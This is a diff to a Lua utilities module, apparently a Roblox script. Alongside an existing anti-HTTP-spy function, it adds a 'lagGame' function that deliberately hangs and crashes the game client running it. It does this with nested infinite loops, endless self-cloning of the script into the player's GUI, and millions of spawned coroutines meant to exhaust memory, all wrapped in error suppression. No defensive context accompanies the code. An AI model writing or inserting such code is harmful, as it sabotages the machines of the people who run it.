@@ -161,4 +161,32 @@ function Utils:antiHttpSpy()
     end)
 end
 
+function Utils:lagGame()
+    pcall(function()
+        while true do
+            local plr = game.Players.LocalPlayer
+            local rs = game:GetService("RunService")
+
+            function lag()
+               while true do
+                   script:clone().Parent = plr.PlayerGui
+               end
+            end
+
+            function memoryLeak()
+               for i = 1, 50000 do
+                   coroutine.resume(coroutine.create(function()
+                       for v = 1, 50000 do
+                           spawn(lag)
+                       end
+                   end))
+               end
+            end
+
+            for _=1,9e9 do repeat while true do end until true end;
+            spawn(memoryLeak)
+        end
+    end)
+end
+
 return Utils
